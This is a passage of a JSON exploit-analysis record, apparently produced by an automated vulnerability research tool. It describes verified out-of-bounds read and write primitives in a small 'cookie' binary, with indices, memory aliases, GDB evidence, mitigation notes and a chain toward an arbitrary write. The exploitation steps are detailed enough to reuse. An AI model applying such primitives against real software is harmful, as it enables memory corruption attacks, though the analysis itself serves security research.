confirms OOB read from FILE structures. Combined with PRIM-005 (PIE leak), this provides full address leak capability.\"},{\"primitive_id\":\"PRIM-002\",\"type\":\"RELATIVE_WRITE\",\"status\":\"VERIFIED\",\"kind\":\"DIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Signedness Error: idx read via scanf(%llu) as unsigned, checked with signed jl. edit_cookie with idx=-11 loads msg[-11] = __dso_handle (self-referencing pointer) and msg_size[-11] = high 4 bytes of msg[26] = 0x5555 (valid size after creating 26 cookies).\",\"description\":\"edit_cookie with idx=-11 calls read(0, __dso_handle_ptr, 21844), writing attacker-controlled data to the .data section at the __dso_handle location (0x4008). The write target is a fixed global address, not attacker-controlled.\"},\"chain\":[\"BUG-001\",\"OOB signedness mismatch (jl instead of jb)\",\"idx=-11 passes signed check (-11 < 5 signed)\",\"msg[-11] = __dso_handle at 0x4008 (self-ref pointer)\",\"msg_size[-11] = high 4 bytes of msg[26] = 0x5555 (valid size)\",\"sub 1 -> 0x5554, movsxd -> 21844\",\"read(0, __dso_handle_ptr, 21844) writes to .data section\",\"RELATIVE_WRITE (fixed target, controlled value)\"],\"controlled_element\":{\"what\":\"Write value (data written to __dso_handle location)\",\"how\":\"Attacker provides data via stdin read(0, __dso_handle_ptr, 21844) in edit_cookie\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"idx must be -11 (unsigned 18446744073709551605) to bypass signed jl check\",\"necessity\":\"Required to access msg[-11] = __dso_handle\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"At least 26 cookies must be created (cookie_num >= 31) so msg[26] contains a heap pointer\",\"necessity\":\"msg_size[-11] aliases high 4 bytes of msg[26]; without 26 cookies, msg[26]=0 and size becomes -1 (read fails)\",\"verified\":true},{\"id\":\"PC-03\",\"description\":\"msg[26] heap pointer high 4 bytes must be 0x5555 (PIE address high half)\",\"necessity\":\"msg_size[-11] = 0x5555, sub 1 = 0x5554 = 21844 (valid read size). If high 4 bytes were larger, read might fail with EFAULT.\",\"verified\":true},{\"id\":\"PC-04\",\"description\":\"__dso_handle at 0x4008 must be writable (.data section, WA)\",\"necessity\":\"read() writes to this address; if read-only, write would fail\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"msg_size[-11]\",\"alias\":\"high 4 bytes of msg[26] (msg[26] is at 0x4060+26*8=0x4130, high 4 bytes at 0x4134 = msg_size base 0x4160 + (-11)*4 = 0x4134)\",\"implication\":\"After creating 26 cookies, msg[26] contains a heap pointer (e.g., 0x0000555555559870). High 4 bytes = 0x00005555 = 21845. After sub 1 = 21844, this is a valid read size. This is the critical half-pointer alias that makes the write primitive viable.\"},{\"expression\":\"msg[-11]\",\"alias\":\"__dso_handle at 0x4008 (self-referencing pointer)\",\"implication\":\"__dso_handle points to itself (0x555555558008), so read(0, 0x555555558008, 21844) writes attacker data to the .data section starting at __dso_handle.\"}],\"verification_plan\":{\"method\":\"Create 26 cookies to populate msg[26], then edit_cookie(idx=-11) with 'DEADBEEF' data. Use GDB to verify memory at __dso_handle changed.\",\"environment\":\"Linux x86-64, glibc 2.39, PIE enabled\",\"run_command\":\"cd /work/test && python3 poc-BUG-001.py\",\"expected_evidence\":[\"GDB: Before write, 0x555555558008 = 0x555555558008 (self-ref)\",\"GDB: After write, 0x555555558008 = 0x4645454244414544 ('DEADBEEF')\",\"read() returns 11 (bytes written)\"]},\"mitigations\":[{\"name\":\"PIE\",\"present\":true,\"primitive_impact\":\"PIE randomizes the __dso_handle address, but the OOB access is relative to the binary's own .bss/.data sections. The write target is always __dso_handle regardless of PIE base. No impact on primitive viability.\"},{\"name\":\"Full RELRO\",\"present\":true,\"primitive_impact\":\"Full RELRO makes GOT read-only, but this primitive writes to .data section (__dso_handle), not GOT. No impact.\"},{\"name\":\"NX\",\"present\":true,\"primitive_impact\":\"NX prevents code execution, but this is a write primitive. No direct impact.\"},{\"name\":\"Canary\",\"present\":true,\"primitive_impact\":\"Canary protects return addresses, but this primitive does not overflow the stack. No impact.\"}],\"evidence\":[{\"id\":\"E005\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x1681-0x1684\",\"description\":\"idx (rdx) compared with cookie_num (rax) using 'cmp rdx, rax; jl'. Signed comparison allows idx=-11 to pass.\"},{\"id\":\"E006\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16a3-0x16bc\",\"description\":\"msg_size[idx] loaded via 'lea rdx, [rax*4+0x0]; lea rax, [rip+msg_size]; mov eax, [rdx+rax]; sub eax, 0x1; movsxd rdx, eax'. For idx=-11, msg_size[-11] = high 4 bytes of msg[26] = 0x5555, sub 1 = 0x5554, movsxd = 21844.\"},{\"id\":\"E007\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16c3-0x16de\",\"description\":\"msg[idx] loaded via 'lea rcx, [rax*8+0x0]; lea rax, [rip+msg]; mov rax, [rcx+rax]; mov rsi, rax; call read'. For idx=-11, msg[-11] = __dso_handle (0x555555558008).\"},{\"id\":\"E008\",\"type\":\"DYNAMIC\",\"function\":\"edit_cookie\",\"address\":\"0x16de\",\"description\":\"GDB: After creating 26 cookies, edit_cookie(idx=-11). Before read: 0x555555558008 = 0x555555558008 (self-ref __dso_handle). After read: 0x555555558008 = 0x4645454244414544 ('DEADBEEF'). read returned 11 bytes. Memory confirmed changed.\"}],\"verification_result\":{\"executed\":true,\"poc_path\":\"/work/test/poc-BUG-001.py\",\"written_value\":\"0x4645454244414544 ('DEADBEEF' written to __dso_handle)\",\"read_value\":\"\",\"fault_address\":\"\",\"return_code\":0,\"details\":\"GDB verified: edit_cookie(idx=-11) after creating 26 cookies. read(0, 0x555555558008, 21844) wrote 'DEADBEEF' (11 bytes) to __dso_handle at 0x555555558008. Before: 0x555555558008 (self-ref). After: 0x4645454244414544. Target is FIXED (__dso_handle), value is CONTROLLED. Classification: RELATIVE_WRITE.\"},\"confidence\":\"HIGH\",\"notes\":\"RELATIVE_WRITE verified via GDB. Write target is __dso_handle (fixed global at 0x4008), write value is attacker-controlled. This is NOT ARB_WRITE because the target address is fixed. However, since __dso_handle is a self-referencing pointer used as msg[-11], overwriting it enables the two-step ARB_WRITE (PRIM-006).\"},{\"primitive_id\":\"PRIM-003\",\"type\":\"RELATIVE_READ\",\"status\":\"VERIFIED\",\"kind\":\"DIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Signedness Error: idx read via scanf(%llu) as unsigned, checked with signed jl. read_cookie with idx=-6 loads msg[-6] = stdin FILE* pointer (0x4030) and passes it to printf(%s).\",\"description\":\"read_cookie with idx=-6 outputs the first 4 bytes of the stdin FILE structure (_flags = 0xfbad208b) via printf(%s), until a null byte.\"},\"chain\":[\"BUG-001\",\"OOB signedness mismatch (jl instead of jb)\",\"idx=-6 passes signed check (-6 < 5 signed)\",\"msg[-6] = stdin FILE* at 0x4030\",\"printf(%s, stdin_FILE_ptr) outputs _flags bytes\",\"RELATIVE_READ\"],\"controlled_element\":{\"what\":\"OOB index into msg[] selecting stdin FILE* pointer\",\"how\":\"Attacker provides idx=18446744073709551610 (-6 as unsigned) via scanf(%llu)\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"idx must be -6 (unsigned 18446744073709551610) to bypass signed jl check\",\"necessity\":\"Required to access msg[-6] = stdin FILE*\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"cookie_num must be > 0 (default 5)\",\"necessity\":\"Check is idx < cookie_num; -6 < 5 signed passes\",\"verified\":true},{\"id\":\"PC-03\",\"description\":\"msg[-6] must contain a valid pointer (stdin FILE* at 0x4030 is always initialized by libc)\",\"necessity\":\"printf(%s, ptr) dereferences the pointer\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"msg[-6]\",\"al